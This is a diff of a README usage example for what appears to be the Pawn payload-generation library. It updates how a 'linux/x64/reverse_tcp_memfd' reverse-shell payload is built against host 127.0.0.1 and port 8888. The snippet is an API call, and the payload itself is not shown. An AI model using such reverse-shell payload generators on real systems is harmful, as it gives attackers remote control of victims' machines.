@@ -41,16 +41,18 @@ from pawn import Pawn
 
 pawn = Pawn()
 
-payload, send_size = pawn.get_pawn(
+module = pawn.get_pawn(
     module='linux/x64/reverse_tcp_memfd',
     platfrom='linux',
     arch='x64',
-    host='127.0.0.1',
-    port=8888
+    type='reverse_tcp'
 )
 
+module.set('host', '127.0.0.1')
+module.set('port', 8888)
+
+payload = pawn.run_module(module)
 print(len(payload))
-print(payload)
 ```
 
 ## Special Thanks
